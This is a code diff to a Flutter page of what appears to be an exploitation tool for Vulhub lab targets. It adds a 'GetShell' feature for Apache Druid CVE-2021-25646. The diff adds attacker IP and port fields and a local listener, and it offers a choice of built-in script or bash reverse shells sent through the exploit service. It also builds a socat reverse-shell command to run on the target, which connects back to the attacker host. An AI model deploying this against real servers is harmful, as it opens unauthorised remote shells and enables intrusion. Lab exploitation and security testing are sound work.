@@ -2,8 +2,10 @@ import 'package:flutter/material.dart';
 
 import '../../app/constants.dart';
 import '../../exp/vulhub/misc_http_exp_service.dart';
+import '../../services/reverse_shell_service.dart';
 import '_vulhub_page_helpers.dart';
 import 'base_vulhub_exp_page.dart';
+import '../reverse_shell_terminal_page.dart';
 
 class DruidExpPage extends BaseVulhubExpPage {
   const DruidExpPage({super.key});
@@ -27,7 +29,20 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
 
   final _urlCtrl = TextEditingController();
   final _cmdCtrl = TextEditingController(text: 'id');
+  final _lhostCtrl = TextEditingController();
+  final _lportCtrl = TextEditingController(text: '4444');
   final _timeoutCtrl = TextEditingController();
+  final ReverseShellService _rs = ReverseShellService();
+
+  @override
+  void initState() {
+    super.initState();
+    _rs.loadConfig().then((_) {
+      if (!mounted) return;
+      _lhostCtrl.text = _rs.lhost;
+      _lportCtrl.text = _rs.lport.toString();
+    });
+  }
 
   DruidExpService _svc() => DruidExpService(
         baseUrl: _urlCtrl.text.trim(),
@@ -69,10 +84,125 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
     }
   }
 
+  Future<void> _showReverseShellDialog() async {
+    if (_urlCtrl.text.trim().isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
+    final mode = await showDialog<String>(
+      context: context,
+      builder: (context) {
+        String selected = 'script';
+        return StatefulBuilder(
+          builder: (context, setState) {
+            return AlertDialog(
+              title: const Text('选择完整终端方案'),
+              content: Column(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  RadioListTile<String>(
+                    value: 'script',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('内置反弹 · script 模式'),
+                  ),
+                  RadioListTile<String>(
+                    value: 'bash',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('内置反弹 · bash 模式'),
+                  ),
+                  RadioListTile<String>(
+                    value: 'socat',
+                    groupValue: selected,
+                    onChanged: (v) => setState(() => selected = v!),
+                    title: const Text('socat 反弹（手动执行）'),
+                  ),
+                ],
+              ),
+              actions: [
+                TextButton(
+                  onPressed: () => Navigator.of(context).pop(null),
+                  child: const Text('取消'),
+                ),
+                FilledButton(
+                  onPressed: () => Navigator.of(context).pop(selected),
+                  child: const Text('确定'),
+                ),
+              ],
+            );
+          },
+        );
+      },
+    );
+    if (mode == null) return;
+
+    final lhost = _lhostCtrl.text.trim();
+    final lport = int.tryParse(_lportCtrl.text.trim()) ?? 4444;
+    if (lhost.isEmpty || lport <= 0 || lport > 65535) {
+      appendLog('[!] LHOST/LPORT 无效');
+      return;
+    }
+
+    _rs.lhost = lhost;
+    _rs.lport = lport;
+    _rs.saveConfig();
+
+    final nav = Navigator.of(context);
+    _rs.onSession = (session) {
+      session.label = 'Druid-CVE-2021-25646';
+      if (!mounted) return;
+      nav.push(
+        MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+      );
+    };
+
+    setState(() => running = true);
+    appendLog('[*] 启动完整终端监听: $lhost:$lport ($mode)');
+    try {
+      await _rs.startListening(port: lport);
+
+      if (mode == 'socat') {
+        final cmd =
+            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
+        appendLog('[i] 在目标执行 socat 命令建立连接:');
+        appendLog(cmd);
+        if (mounted) {
+          await showDialog<void>(
+            context: context,
+            builder: (_) => AlertDialog(
+              title: const Text('socat 反弹命令'),
+              content: SelectableText(cmd),
+              actions: [
+                TextButton(
+                  onPressed: () => Navigator.of(context).pop(),
+                  child: const Text('关闭'),
+                ),
+              ],
+            ),
+          );
+        }
+      } else {
+        final ok = await _svc().startReverseShell(
+          lhost,
+          lport,
+          preferScript: mode == 'script',
+        );
+        appendLog(ok ? '[+] 已发送反弹 shell，等待连接...' : '[-] 发送失败');
+      }
+    } catch (e) {
+      appendLog('[!] 启动失败: $e');
+    } finally {
+      if (mounted) setState(() => running = false);
+    }
+  }
+
   @override
   void dispose() {
     _urlCtrl.dispose();
     _cmdCtrl.dispose();
+    _lhostCtrl.dispose();
+    _lportCtrl.dispose();
     _timeoutCtrl.dispose();
     super.dispose();
   }
@@ -99,6 +229,13 @@ class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
           vTf(_cmdCtrl, '命令', 'id'),
           const SizedBox(height: 8),
           vBtn('执行命令', running ? null : _exec),
+          const SizedBox(height: 16),
+          vSecTitle('GetShell（反弹 Shell）'),
+          vTf(_lhostCtrl, '攻击机 IP', '127.0.0.1'),
+          const SizedBox(height: 8),
+          vTf(_lportCtrl, '攻击机端口', '4444', type: TextInputType.number),
+          const SizedBox(height: 8),
+          vBtn('完整终端（反弹Shell）', running ? null : _showReverseShellDialog),
         ],
       ),
     );
